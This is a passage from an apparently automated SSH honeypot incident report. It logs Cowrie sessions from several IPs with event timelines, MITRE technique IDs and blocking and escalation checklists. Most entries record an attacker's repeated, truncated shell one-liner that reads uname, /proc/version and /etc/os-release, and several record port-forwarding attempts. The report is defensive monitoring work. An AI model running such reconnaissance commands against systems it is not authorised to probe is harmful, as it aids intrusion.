| `2026-07-08 04:02:44` | `cowrie.command.failed` |
| `2026-07-08 04:02:44` | `cowrie.command.input` |
| `2026-07-08 04:02:44` | `cowrie.log.closed` |
| `2026-07-08 04:02:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.232[.]48` to AbuseIPDB if not already reported
- [ ] Block `34.76.232[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0cccedc39a1

| Field | Detail |
|---|---|
| **Source IP** | `34.76.232[.]48` |
| **First Seen** | 2026-07-08 04:02 |
| **Last Seen** | 2026-07-08 04:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:02:57` | `cowrie.session.connect` |
| `2026-07-08 04:02:57` | `cowrie.login.success` |
| `2026-07-08 04:02:58` | `cowrie.session.params` |
| `2026-07-08 04:02:58` | `cowrie.command.input` |
| `2026-07-08 04:02:58` | `cowrie.command.failed` |
| `2026-07-08 04:03:05` | `cowrie.log.closed` |
| `2026-07-08 04:03:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.232[.]48` to AbuseIPDB if not already reported
- [ ] Block `34.76.232[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f2a68770977

| Field | Detail |
|---|---|
| **Source IP** | `34.76.232[.]48` |
| **First Seen** | 2026-07-08 04:02 |
| **Last Seen** | 2026-07-08 04:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:02:59` | `cowrie.session.connect` |
| `2026-07-08 04:02:59` | `cowrie.login.success` |
| `2026-07-08 04:02:59` | `cowrie.session.params` |
| `2026-07-08 04:02:59` | `cowrie.command.input` |
| `2026-07-08 04:03:05` | `cowrie.log.closed` |
| `2026-07-08 04:03:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.232[.]48` to AbuseIPDB if not already reported
- [ ] Block `34.76.232[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-037828c5e593

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 04:03 |
| **Last Seen** | 2026-07-08 04:03 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:03:11` | `cowrie.session.connect` |
| `2026-07-08 04:03:12` | `cowrie.client.version` |
| `2026-07-08 04:03:12` | `cowrie.client.kex` |
| `2026-07-08 04:03:18` | `cowrie.login.success` |
| `2026-07-08 04:03:22` | `cowrie.session.params` |
| `2026-07-08 04:03:22` | `cowrie.command.input` |
| `2026-07-08 04:03:23` | `cowrie.log.closed` |
| `2026-07-08 04:03:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95fff9194759

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:03 |
| **Last Seen** | 2026-07-08 04:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:03:39` | `cowrie.session.connect` |
| `2026-07-08 04:03:40` | `cowrie.client.version` |
| `2026-07-08 04:03:40` | `cowrie.client.kex` |
| `2026-07-08 04:03:45` | `cowrie.login.success` |
| `2026-07-08 04:03:48` | `cowrie.session.params` |
| `2026-07-08 04:03:48` | `cowrie.command.input` |
| `2026-07-08 04:03:48` | `cowrie.command.input` |
| `2026-07-08 04:03:48` | `cowrie.command.input` |
| `2026-07-08 04:03:48` | `cowrie.command.input` |
| `2026-07-08 04:03:48` | `cowrie.command.input` |
| `2026-07-08 04:03:48` | `cowrie.command.success` |
| `2026-07-08 04:03:48` | `cowrie.command.input` |
| `2026-07-08 04:03:48` | `cowrie.command.input` |
| `2026-07-08 04:03:48` | `cowrie.command.input` |
| `2026-07-08 04:03:48` | `cowrie.command.input` |
| `2026-07-08 04:03:49` | `cowrie.log.closed` |
| `2026-07-08 04:03:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9bd5ab6528c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:05 |
| **Last Seen** | 2026-07-08 04:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:05:08` | `cowrie.session.connect` |
| `2026-07-08 04:05:09` | `cowrie.client.version` |
| `2026-07-08 04:05:09` | `cowrie.client.kex` |
| `2026-07-08 04:05:13` | `cowrie.login.success` |
| `2026-07-08 04:05:14` | `cowrie.session.params` |
| `2026-07-08 04:05:14` | `cowrie.command.input` |
| `2026-07-08 04:05:14` | `cowrie.command.input` |
| `2026-07-08 04:05:14` | `cowrie.command.input` |
| `2026-07-08 04:05:14` | `cowrie.command.input` |
| `2026-07-08 04:05:14` | `cowrie.command.input` |
| `2026-07-08 04:05:14` | `cowrie.command.success` |
| `2026-07-08 04:05:14` | `cowrie.command.input` |
| `2026-07-08 04:05:14` | `cowrie.command.input` |
| `2026-07-08 04:05:14` | `cowrie.command.input` |
| `2026-07-08 04:05:15` | `cowrie.command.input` |
| `2026-07-08 04:05:15` | `cowrie.log.closed` |
| `2026-07-08 04:05:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a015d337753

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:06 |
| **Last Seen** | 2026-07-08 04:06 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:06:37` | `cowrie.session.connect` |
| `2026-07-08 04:06:38` | `cowrie.client.version` |
| `2026-07-08 04:06:38` | `cowrie.client.kex` |
| `2026-07-08 04:06:43` | `cowrie.login.success` |
| `2026-07-08 04:06:46` | `cowrie.session.params` |
| `2026-07-08 04:06:46` | `cowrie.command.input` |
| `2026-07-08 04:06:46` | `cowrie.command.input` |
| `2026-07-08 04:06:46` | `cowrie.command.input` |
| `2026-07-08 04:06:46` | `cowrie.command.input` |
| `2026-07-08 04:06:46` | `cowrie.command.input` |
| `2026-07-08 04:06:46` | `cowrie.command.success` |
| `2026-07-08 04:06:46` | `cowrie.command.input` |
| `2026-07-08 04:06:46` | `cowrie.command.input` |
| `2026-07-08 04:06:46` | `cowrie.command.input` |
| `2026-07-08 04:06:46` | `cowrie.command.input` |
| `2026-07-08 04:06:47` | `cowrie.log.closed` |
| `2026-07-08 04:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3931d0a329ab

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:08 |
| **Last Seen** | 2026-07-08 04:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:08:06` | `cowrie.session.connect` |
| `2026-07-08 04:08:07` | `cowrie.client.version` |
| `2026-07-08 04:08:07` | `cowrie.client.kex` |
| `2026-07-08 04:08:11` | `cowrie.login.success` |
| `2026-07-08 04:08:13` | `cowrie.session.params` |
| `2026-07-08 04:08:13` | `cowrie.command.input` |
| `2026-07-08 04:08:13` | `cowrie.command.input` |
| `2026-07-08 04:08:13` | `cowrie.command.input` |
| `2026-07-08 04:08:13` | `cowrie.command.input` |
| `2026-07-08 04:08:13` | `cowrie.command.input` |
| `2026-07-08 04:08:13` | `cowrie.command.success` |
| `2026-07-08 04:08:13` | `cowrie.command.input` |
| `2026-07-08 04:08:13` | `cowrie.command.input` |
| `2026-07-08 04:08:13` | `cowrie.command.input` |
| `2026-07-08 04:08:13` | `cowrie.command.input` |
| `2026-07-08 04:08:14` | `cowrie.log.closed` |
| `2026-07-08 04:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0874d16e4813

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:09 |
| **Last Seen** | 2026-07-08 04:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:09:37` | `cowrie.session.connect` |
| `2026-07-08 04:09:37` | `cowrie.client.version` |
| `2026-07-08 04:09:37` | `cowrie.client.kex` |
| `2026-07-08 04:09:41` | `cowrie.login.success` |
| `2026-07-08 04:09:43` | `cowrie.session.params` |
| `2026-07-08 04:09:43` | `cowrie.command.input` |
| `2026-07-08 04:09:43` | `cowrie.command.input` |
| `2026-07-08 04:09:43` | `cowrie.command.input` |
| `2026-07-08 04:09:43` | `cowrie.command.input` |
| `2026-07-08 04:09:43` | `cowrie.command.input` |
| `2026-07-08 04:09:43` | `cowrie.command.success` |
| `2026-07-08 04:09:43` | `cowrie.command.input` |
| `2026-07-08 04:09:43` | `cowrie.command.input` |
| `2026-07-08 04:09:43` | `cowrie.command.input` |
| `2026-07-08 04:09:43` | `cowrie.command.input` |
| `2026-07-08 04:09:44` | `cowrie.log.closed` |
| `2026-07-08 04:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-705e2b2a66c8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:11 |
| **Last Seen** | 2026-07-08 04:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:11:06` | `cowrie.session.connect` |
| `2026-07-08 04:11:07` | `cowrie.client.version` |
| `2026-07-08 04:11:07` | `cowrie.client.kex` |
| `2026-07-08 04:11:10` | `cowrie.login.success` |
| `2026-07-08 04:11:12` | `cowrie.session.params` |
| `2026-07-08 04:11:12` | `cowrie.command.input` |
| `2026-07-08 04:11:12` | `cowrie.command.input` |
| `2026-07-08 04:11:12` | `cowrie.command.input` |
| `2026-07-08 04:11:12` | `cowrie.command.input` |
| `2026-07-08 04:11:12` | `cowrie.command.input` |
| `2026-07-08 04:11:12` | `cowrie.command.success` |
| `2026-07-08 04:11:12` | `cowrie.command.input` |
| `2026-07-08 04:11:12` | `cowrie.command.input` |
| `2026-07-08 04:11:12` | `cowrie.command.input` |
| `2026-07-08 04:11:12` | `cowrie.command.input` |
| `2026-07-08 04:11:13` | `cowrie.log.closed` |
| `2026-07-08 04:11:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bad2bd37d090

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:12 |
| **Last Seen** | 2026-07-08 04:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:12:34` | `cowrie.session.connect` |
| `2026-07-08 04:12:35` | `cowrie.client.version` |
| `2026-07-08 04:12:35` | `cowrie.client.kex` |
| `2026-07-08 04:12:38` | `cowrie.login.success` |
| `2026-07-08 04:12:40` | `cowrie.session.params` |
| `2026-07-08 04:12:40` | `cowrie.command.input` |
| `2026-07-08 04:12:40` | `cowrie.command.input` |
| `2026-07-08 04:12:40` | `cowrie.command.input` |
| `2026-07-08 04:12:40` | `cowrie.command.input` |
| `2026-07-08 04:12:40` | `cowrie.command.input` |
| `2026-07-08 04:12:40` | `cowrie.command.success` |
| `2026-07-08 04:12:40` | `cowrie.command.input` |
| `2026-07-08 04:12:40` | `cowrie.command.input` |
| `2026-07-08 04:12:40` | `cowrie.command.input` |
| `2026-07-08 04:12:40` | `cowrie.command.input` |
| `2026-07-08 04:12:40` | `cowrie.log.closed` |
| `2026-07-08 04:12:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c77546e3ea3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:14 |
| **Last Seen** | 2026-07-08 04:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:14:02` | `cowrie.session.connect` |
| `2026-07-08 04:14:02` | `cowrie.client.version` |
| `2026-07-08 04:14:02` | `cowrie.client.kex` |
| `2026-07-08 04:14:05` | `cowrie.login.success` |
| `2026-07-08 04:14:07` | `cowrie.session.params` |
| `2026-07-08 04:14:07` | `cowrie.command.input` |
| `2026-07-08 04:14:07` | `cowrie.command.input` |
| `2026-07-08 04:14:07` | `cowrie.command.input` |
| `2026-07-08 04:14:07` | `cowrie.command.input` |
| `2026-07-08 04:14:07` | `cowrie.command.input` |
| `2026-07-08 04:14:07` | `cowrie.command.success` |
| `2026-07-08 04:14:07` | `cowrie.command.input` |
| `2026-07-08 04:14:07` | `cowrie.command.input` |
| `2026-07-08 04:14:07` | `cowrie.command.input` |
| `2026-07-08 04:14:07` | `cowrie.command.input` |
| `2026-07-08 04:14:08` | `cowrie.log.closed` |
| `2026-07-08 04:14:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddbd9437b230

| Field | Detail |
|---|---|
| **Source IP** | `76.133.97[.]153` |
| **First Seen** | 2026-07-08 04:14 |
| **Last Seen** | 2026-07-08 04:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:14:55` | `cowrie.session.connect` |
| `2026-07-08 04:14:56` | `cowrie.client.version` |
| `2026-07-08 04:14:56` | `cowrie.client.kex` |
| `2026-07-08 04:14:57` | `cowrie.login.success` |
| `2026-07-08 04:14:57` | `cowrie.direct-tcpip.request` |
| `2026-07-08 04:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.133.97[.]153` to AbuseIPDB if not already reported
- [ ] Block `76.133.97[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-815441d05800

| Field | Detail |
|---|---|
| **Source IP** | `58.17.128[.]7` |
| **First Seen** | 2026-07-08 04:15 |
| **Last Seen** | 2026-07-08 04:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:15:03` | `cowrie.session.connect` |
| `2026-07-08 04:15:04` | `cowrie.client.version` |
| `2026-07-08 04:15:04` | `cowrie.client.kex` |
| `2026-07-08 04:15:06` | `cowrie.login.success` |
| `2026-07-08 04:15:07` | `cowrie.direct-tcpip.request` |
| `2026-07-08 04:15:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.17.128[.]7` to AbuseIPDB if not already reported
- [ ] Block `58.17.128[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7de8e012f0f8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 04:15 |
| **Last Seen** | 2026-07-08 04:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:15:31` | `cowrie.session.connect` |
| `2026-07-08 04:15:31` | `cowrie.client.version` |
| `2026-07-08 04:15:31` | `cowrie.client.kex` |
| `2026-07-08 04:15:34` | `cowrie.login.success` |
| `2026-07-08 04:15:35` | `cowrie.session.params` |
| `2026-07-08 04:15:35` | `cowrie.command.input` |
| `2026-07-08 04:15:35` | `cowrie.command.input` |
| `2026-07-08 04:15:35` | `cowrie.command.input` |
| `2026-07-08 04:15:35` | `cowrie.command.input` |
| `2026-07-08 04:15:35` | `cowrie.command.input` |
| `2026-07-08 04:15:35` | `cowrie.command.success` |
| `2026-07-08 04:15:35` | `cowrie.command.input` |
| `2026-07-08 04:15:35` | `cowrie.command.input` |
| `2026-07-08 04:15:35` | `cowrie.command.input` |
| `2026-07-08 04:15:35` | `cowrie.command.input` |
| `2026-07-08 04:15:36` | `cowrie.log.closed` |
| `2026-07-08 04:15:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0954771ceec

| Field | Detail |
|---|---|
| **Source IP** | `182.73.164[.]228` |
| **First Seen** | 2026-07-08 04:15 |
| **Last Seen** | 2026-07-08 04:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 04:15:54` | `cowrie.session.connect` |
| `2026-07-08 04:15:55` | `cowrie.client.version` |
| `2026-07-08 04:15:55` | `cowrie.client.kex` |
| `2026-07-08 04:15:58` | `cowrie.login.success` |
| `2026-07-08 04:15:59` | `cowrie.direct-tcpip.request` |
| `2026-07-08 04:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.73.164[.]228` to AbuseIPDB if not already reported
- [ ] Block `182.73.164[.]228` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c2cb1c1fb6e

| Field | Detail |
|---|---|
| **Source IP** | `122.187.228[.]228` |
| **First Seen** | 2026-07-08 04:16 |
| **Last Seen** | 2026-07-08 04:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
